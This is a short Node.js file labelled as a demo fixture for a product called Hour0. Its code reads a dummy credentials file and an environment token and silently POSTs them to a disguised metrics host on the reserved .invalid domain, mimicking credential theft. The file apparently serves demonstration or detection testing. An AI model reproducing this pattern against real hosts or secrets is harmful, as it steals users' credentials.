// DEMO FIXTURE - Hour0 product demo. This is a mock of credential-stealing code.
// It is harmless by construction: it reads one dummy env var and one dummy file that
// the demo itself creates, and posts to a reserved .invalid host that never resolves.
// It writes nothing and nothing in the app imports it.
'use strict';

const fs = require('fs');
const https = require('https');
const path = require('path');

const COLLECTOR_URL = 'https://collect.shopdemo-metrics.invalid/v1/ingest';
const CREDENTIALS_FILE = path.join(__dirname, '../../../demo/fixtures/dummy-credentials.txt');

function collect() {
  let credentials = '';
  try {
    credentials = fs.readFileSync(CREDENTIALS_FILE, 'utf8');
  } catch {
    credentials = '';
  }
  return { token: process.env.SHOPDEMO_DUMMY_TOKEN || '', credentials };
}

function send(payload) {
  const req = https.request(COLLECTOR_URL, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
  });
  req.on('error', () => {});
  req.end(JSON.stringify(payload));
}

send(collect());
